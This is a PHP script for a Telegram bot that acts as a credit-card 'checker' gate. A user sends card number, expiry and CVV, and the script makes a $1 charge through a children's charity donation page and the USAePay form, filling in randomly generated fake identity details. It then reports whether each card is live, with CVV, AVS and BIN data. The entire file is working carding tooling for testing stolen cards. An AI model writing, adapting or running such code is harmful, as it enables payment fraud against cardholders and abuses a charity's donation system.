<?php

#----------------------------------------------------------------------#
#   GATE: USA-EPAY (AMOUNT = CUSTOM)                                   #
#   SITE: https://www.carsforkids.org/Donation/DonateCash              #
#----------------------------------------------------------------------#
$gate = "USA-Epay ($1)";


if ((strpos($message, "/epay") === 0) || (strpos($message, "!epay") === 0)){

  if (in_array($userId, $premium_users) === false){
    sendMessage($chatId,$premium_unauth_msg, $message_id);
    return;
    }

sendaction($chatId, "typing");
error_reporting(0);
ini_set('display_errors', 0);
date_default_timezone_set('America/Buenos_Aires');


if ($_SERVER['REQUEST_METHOD'] == "POST")   { extract($_POST); }
elseif ($_SERVER['REQUEST_METHOD'] == "GET") { extract($_GET); }



//================ [ INCLUDE FUNCTIONS ] ===============//
//include "./Tools/functions/usefun.php";
//include "./Tools/functions/flagsgen.php";


//================ [ EXPLODE & LISTA ] ===============// 

$lista = substr($message, 5);
    $amount = multiexplode(array("*"), $lista)[1];
        preg_match_all('!\d+!', $amount, $amot);
        $amt = $amot[0][0];;
    if($amt > 50) { $amt = "50"; }
    if($amt < 1) { $amt = "1"; }

$lista = preg_replace('/[^0-9]+/', ' ', $lista);
$lista = ltrim($lista);
    $cc = multiexplode(array(":", "/", " ", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "/", " ", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "/", " ", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "/", " ", "|", ""), $lista)[3];


$strlen1 = strlen($mes);
$ano1 = $ano;
    if(strlen($strlen1 > 2)) {
    $ano = $cvv; 
    $cvv = $mes;
    $mes = $ano1; }


$str1 = substr($cc, 0, 1);
//========================//
    if ($str1 == "4") {
        $typc = "Visa"; }
    elseif ($str1 == "5") {
        $typc = "MasterCard"; }
    elseif ($str1 == "6") {
        $typc = "Discover"; }
    elseif ($str1 == "3") {
        $typc = "American+Express"; }
//========================//


if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";

$first6 = substr($cc, 0, 6);
$last4 = substr($cc, 12, 4);
$lista = "$cc|$mes|$ano|$cvv";






//==================[BIN LOOK-UP]======================//
$bin = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
curl_close($ch);
$bank = urlencode(GetStr($fim, '"bank":{"name":"', '"'));
$brand = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$level = GetStr($fim, '"brand":"', '"');
$name = GetStr($fim, '"name":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
//$benk = ucwords("$bank");

$bindata1 = " $bin | $brand | $type | $level | .$bank | $name ($emoji) ";
$bininfo = "$brand | $type | $level";
$cuntry = "$name ($emoji)";
//$bank = ".$bank";



//=============== [ Random User Details ] ==============//
$get = file_get_contents('https://random-data-api.com/api/users/random_user');
preg_match_all("(\"first_name\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last_name\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street_address\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"zip_code\":\"(.*)\")siU", $get, $matches1);
$zip = $matches1[1][0];
preg_match_all("(\"country\":\"(.*)\")siU", $get, $matches1);
$country = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email1 = $matches1[1][0];

$serve_arr = array("gmail.com","hotmail.com","yahoo.com","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$name.".".$last."1".rand(000,999)."@".$serv_rnd."";
//$username = "".$name."".$last."".rand(1000,9999)."";
$pass = "".$name."@".rand(1000,9999)."";
$phone = "917-266-".rand(1111,9999)."";
$date = ''.date("20y-m-d").'';
if(strlen($zip) > 5) $zip = substr($zip, 0, 5);

$rand = " $name - $last - $street - $city - $zip - $state - $email - $country - $date";







$ip = "Live! ✅";
$gate = 'USA-Epay ($'.$amt.')';

//================= [ CURL REQUESTS ] =================//

#--------------------[1st REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.carsforkids.org/Donation/DonateCash');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.carsforkids.org';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: none';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$res1 = curl_exec($ch);
curl_close($ch);
$csrf1 = trim(strip_tags(getStr($res1,'name="__RequestVerificationToken" type="hidden" value="', '"')));
//echo "<br><b>CSRF1:</b> $csrf1<br>";



#--------------------[2nd REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.carsforkids.org/Donation/DonateCash');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'authority: www.carsforkids.org';
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://www.carsforkids.org';
$headers[] = 'referer: https://www.carsforkids.org/Donation/DonateCash';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'Amount=1&Campus=&Message=Na&FirstName='.$name.'&LastName='.$last.'&Address1='.urlencode($street).'&Address2=&City='.urlencode($city).'&State='.urlencode($state).'&Zip='.$zip.'&Email='.urlencode($gmail).'&Phone='.$phone.'&BillFirstName='.$name.'&BillLastName='.$last.'&BillCountry=UNITED+STATES&BillAddress1='.urlencode($street).'&BillAddress2=&BillCity='.urlencode($city).'&BillState='.urlencode($state).'&BillZip='.$zip.'&BillPhone='.$phone.'&btnSend=Secure+Payment&__RequestVerificationToken='.$csrf1.'&IsRecurring=false');

$res2 = curl_exec($ch);
curl_close($ch);
$key = trim(strip_tags(getStr($res2,'type="hidden" name="UMkey" value="', '"')));
$donationid = trim(strip_tags(getStr($res2,'type="hidden" name="ODonationId" value="', '"')));
$invoice = trim(strip_tags(getStr($res2,'type="hidden" name="UMinvoice" value="', '"')));

//echo "<br><b>UM KEY:</b> $key<br>";
//echo "<br><b>Donation ID:</b> $donationid<br>";
//echo "<br><b>INVOICE:</b> $invoice<br>";



#--------------------[3nd REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.usaepay.com/interface/epayform/');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: www.usaepay.com';
$headers[] = 'origin: https://www.carsforkids.org';
$headers[] = 'referer: https://www.carsforkids.org/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: cross-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'UMkey='.$key.'&UMcommand=sale&UMamount=1&UMrecurring=no&UMbillamount=&UMschedule=&UMnumleft=&ODonationId='.$donationid.'&UMinvoice='.$invoice.'&UMtestmode=0&UMechofields=1&UMcurrency=840&UMdescription=Online+Money+Donations&UMbillfname='.$name.'&UMbilllname='.$last.'&UMbillstreet='.urlencode($street).'&UMbillstreet2=&UMbillcity='.urlencode($city).'&UMbillstate='.urlencode($state).'&UMbillzip='.$zip.'&UMbillcountry=UNITED+STATES&UMbillphone='.$phone.'');

$res3 = curl_exec($ch);
curl_close($ch);
$formstring = trim(strip_tags(getStr($res3,'type="hidden" name="UMformString" value="', '"')));
//echo "<br><b>Form String:</b> $formstring<br>";



#--------------------[4nd REQ]--------------------#
$ch = curl_init();
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
//curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_URL, 'https://www.usaepay.com/interface/epayform');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
$headers = array();
$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/*;q=0.8,application/signed-exchange;v=b3;q=0.9';
$headers[] = 'Accept-Language: en-US,en;q=0.9';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Host: www.usaepay.com';
$headers[] = 'Origin: https://www.usaepay.com';
$headers[] = 'Referer: https://www.usaepay.com/interface/epayform/';
$headers[] = 'sec-fetch-dest: document';
$headers[] = 'sec-fetch-mode: navigate';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.56';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
//curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
//curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'UMsubmit=1&UMkey='.$key.'&UMredirDeclined=&UMredirApproved=&UMhash=&UMmd5hash=&UMmd5key=&UMcommand=sale&UMamount=1&UMtax=&UMinvoice='.$invoice.'&UMcustid=&UMrecurring=no&UMaddcustomer=&UMbillamount=&UMbillfname='.$name.'&UMbilllname='.$last.'&UMcustreceipt=&UMschedule=&UMnumleft=&UMstart=&UMexpire=&UMdescription=Online+Money+Donations&UMechofields=1&UMformString='.$formstring.'&payment_type='.$typc.'&UMname='.$name.'+'.$last.'&UMcard='.$cc.'&UMexpir='.$mes.'%2F'.$ano.'&UMcvv2='.$cvv.'&submitbutton=Process+Payment+%BB');

$res4 = curl_exec($ch);
$Status = trim(strip_tags(getStr($res4,'name="UMstatus" value="', '"')));
$Authc = trim(strip_tags(getStr($res4,'name="UMauthCode" value="', '"')));
$avs = trim(strip_tags(getStr($res4,'name="UMavsResult" value="', '"')));
$avsc = trim(strip_tags(getStr($res4,'name="UMavsResultCode" value="', '"')));
$cvv = trim(strip_tags(getStr($res4,'name="UMcvv2Result" value="', '"')));
$cvvc = trim(strip_tags(getStr($res4,'name="UMcvv2ResultCode" value="', '"')));
$result = trim(strip_tags(getStr($res4,'name="UMresult" value="', '"')));
$error = trim(strip_tags(getStr($res4,'name="UMerror" value="', '"')));
$err_c = trim(strip_tags(getStr($res4,'name="UMerrorcode" value="', '"')));
$cc_res = trim(strip_tags(getStr($res4,'name="UMcardLevelResult" value="', '"')));


$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);







//=================== [ RESPONSES ] ===================//

if ((strpos($res4, 'name="UMerror" value="Approved"')) || (strpos($res4, 'name="UMstatus" value="Approved"')) || (strpos($res4, 'name="UMerrorcode" value="00000">')) ){

    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑢𝑙𝑡: <b> Payment Approved - ['.$Authc.'] </b> ✅%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b><i> '.$error.' ['.$err_c.'] </i></b>%0A✦ 𝐶𝑉𝑉: <b><i> '.$cvv.' ['.$cvvc.'] </i></b>%0A✦ 𝐴𝑉𝑆: <b><i> '.$avs.' ['.$avsc.'] </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($res4, 'name="UMstatus" value="Declined">')) || (strpos($res4, 'name="UMresult" value="D">'))){

    sendMessage($chatId, '<b> '.$gate.' | APPROVED ✅ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b> '.$error.' ['.$err_c.'] </b> ✅%0A✦ 𝐶𝑉𝑉: <b><i> '.$cvv.' ['.$cvvc.'] </i></b>%0A✦ 𝐴𝑉𝑆: <b><i> '.$avs.' ['.$avsc.'] </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


elseif ((strpos($res4, 'name="UMstatus" value="Error">')) || (strpos($res4, 'name="UMresult" value="E">'))){

    sendMessage($chatId, '<b> '.$gate.' | DECLINED! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b> '.$error.' ['.$err_c.'] </b> %0A✦ 𝐶𝑉𝑉: <b><i> '.$cvv.' ['.$cvvc.'] </i></b>%0A✦ 𝐴𝑉𝑆: <b><i> '.$avs.' ['.$avsc.'] </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
}


else {
    sendMessage($chatId, '<b> '.$gate.' | ERROR! ❌ </b>%0A%0A✦ 𝐶𝑎𝑟𝑑: <code>'.$lista.'</code>%0A✦ 𝑅𝑒𝑠𝑝𝑜𝑛𝑐𝑒: <b> '.$error.' ['.$err_c.'] </b> %0A✦ 𝐶𝑉𝑉: <b><i> '.$cvv.' ['.$cvvc.'] </i></b>%0A✦ 𝐴𝑉𝑆: <b><i> '.$avs.' ['.$avsc.'] </i></b>%0A<a> —————————————————</a>%0A✦ 𝑩𝒊𝒏: <i>'.$bininfo.'</i>%0A✦ 𝑩𝒂𝒏𝒌: <i>'.$bank.'</i>%0A✦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: <i>'.$cuntry.'</i>%0A<a> —————————————————</a>%0A%0A𝑃𝑟𝑜𝑥𝑦: <i><b>'.$ip.'</b></i>%0A𝑇𝑖𝑚𝑒 𝑇𝑎𝑘𝑒𝑛: <i><b>'.$time.'s</b></i>%0A𝐶ℎ𝑒𝑐𝑘𝑒𝑑 𝐵𝑦: <i>@'.$username.'</i>%0A<b>═══════════════════</b>%0A𝑩𝒐𝒕 𝒎𝒂𝒅𝒆 𝒃𝒚: <a>[ꜱʜɪɴ々cʜᴀɴ]</a>', $message_id);
  }



curl_close($ch);
unlink("cookie.txt");
}

//====================[ CYBERSOURCE CHARGED ]=====================//

?>